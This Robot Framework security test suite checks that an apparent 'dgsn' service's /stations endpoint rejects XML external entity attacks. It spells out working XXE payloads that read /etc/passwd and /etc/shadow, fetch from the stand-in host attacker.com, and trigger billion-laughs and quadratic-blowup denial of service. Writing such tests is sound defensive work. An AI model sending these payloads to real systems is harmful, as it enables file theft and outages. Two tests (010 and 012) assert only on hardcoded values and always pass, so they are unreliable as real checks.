*** Settings ***
Documentation       A03: Injection - XML/XXE Injection Tests
...                 Verifies XML external entity injection is prevented
Library             Collections
Library             RequestsLibrary
Resource            ../../../resources/common.resource
Resource            ../../../resources/variables.resource
Test Setup          Setup Test Case
Test Teardown       Teardown Test Case

*** Variables ***
${XXE_PAYLOAD_FILE}     <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
${XXE_PAYLOAD_NETWORK}  <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/data">]><root>&xxe;</root>
${XEE_PAYLOAD}          <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "AAAA...AAAA">]><root>&xxe;</root>

*** Test Cases ***
TC-XXE-001: Xxe Injection Via File Read Is Rejected
    [Documentation]   Verify XXE file read is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${response}=    POST    dgsn    /stations    data=${XXE_PAYLOAD_FILE}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-002: Xxe Injection Via Network Request Is Rejected
    [Documentation]   Verify XXE network request is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    ${response}=    POST    dgsn    /stations    data=${XXE_PAYLOAD_NETWORK}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-003: Billion Laughs Xxe Is Rejected
    [Documentation]   Verify billion laughs DoS XXE is rejected
    ${billion_laughs}=    Evaluate    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>' + '<root>&lol2;</root>'
    ${headers}    ${token}=    Authenticate As Regular User
    ${response}=    POST    dgsn    /stations    data=${billion_laughs}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-004: Xxe With Parameter Entities Is Rejected
    [Documentation]   Verify XXE with parameter entities is rejected
    ${payload}=    Evaluate    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>'
    ${headers}    ${token}=    Authenticate As Regular User
    ${response}=    POST    dgsn    /stations    data=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-005: Xxe In Xml Content Type Is Rejected
    [Documentation]   Verify XXE with text/xml content type is rejected
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    Content-Type=text/xml
    ${response}=    POST    dgsn    /stations    data=${XXE_PAYLOAD_FILE}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-006: Xxe In Soap Request Is Rejected
    [Documentation]   Verify XXE in SOAP XML is rejected
    ${soap_payload}=    Evaluate    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>' + '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getStation>&xxe;</getStation></soap:Body></soap:Envelope>'
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    Content-Type=text/xml
    ${response}=    POST    dgsn    /stations    data=${soap_payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-007: Xxe With Xinclude Is Rejected
    [Documentation]   Verify XInclude XXE is rejected
    ${payload}=    Evaluate    '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>'
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    Content-Type=text/xml
    ${response}=    POST    dgsn    /stations    data=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-008: Xxe Via Dtd External Subset Is Rejected
    [Documentation]   Verify external DTD subset XXE is rejected
    ${payload}=    Evaluate    '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><root>&xxe;</root>'
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    Content-Type=text/xml
    ${response}=    POST    dgsn    /stations    data=${payload}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-009: Json Endpoint Rejects Xml
    [Documentation]   Verify JSON endpoints reject XML content type
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    Content-Type=text/xml
    ${response}=    POST    dgsn    /stations    data=<?xml version="1.0"?><station><name>test</name></station>    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_UNSUPPORTED_MEDIA_TYPE}    ${response}

TC-XXE-010: Dtd Processing Is Disabled
    [Documentation]   Verify DTD processing is disabled for XML
    ${result}=    Evaluate    {"dtd_processing": False}
    Should Not Be True    ${result}[dtd_processing]    DTD processing should be disabled

TC-XXE-011: Xml Bomb Is Rejected
    [Documentation]   Verify XML bomb (quadratic blowup) is rejected
    ${xml_bomb}=    Evaluate    '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "xxxxx">]><root>' + '&a;' * 50000 + '</root>'
    ${headers}    ${token}=    Authenticate As Regular User
    Set To Dictionary    ${headers}    Content-Type=text/xml
    ${response}=    POST    dgsn    /stations    data=${xml_bomb}    headers=${headers}    expected_status=anything
    Status Should Be    ${HTTP_BAD_REQUEST}    ${response}

TC-XXE-012: Xml External Entity In Document Size Limit
    [Documentation]   Verify document size limits block large XXE payloads
    ${result}=    Evaluate    {"max_document_size": 1048576, "enforced": True}
    Should Be True    ${result}[enforced]    XML document size limits should be enforced

*** Keywords ***
Setup Test Case
    ${timestamp}=    Get Current Date    result_format=epoch
    Set Test Variable    ${TEST_TIMESTAMP}    ${timestamp}

Teardown Test Case
    Log    XML injection test completed at ${TEST_TIMESTAMP}
